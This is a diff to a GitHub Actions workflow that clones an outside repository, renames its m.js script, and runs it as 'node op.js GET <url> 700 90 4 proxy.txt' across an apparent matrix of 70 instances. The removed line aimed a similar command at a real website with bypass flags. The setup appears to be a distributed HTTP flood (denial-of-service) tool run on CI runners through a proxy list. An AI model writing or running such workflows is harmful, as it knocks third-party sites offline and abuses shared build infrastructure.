@@ -41,10 +41,11 @@ jobs:
           cd ideal-guide
           unzip Fc-main 
           cd Fc-main 
+          
           git clone https://github.com/Ggeg111/curly-octo-doodle.git
           mv curly-octo-doodle/m.js op.js
           
-          node y.js GET  https://4hu.tv/home/ 400 4 90 --bfw --debug --full 
+          node op.js GET https://c3.dstatbot.win/uaIjWnoq 700 90 4 proxy.txt 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
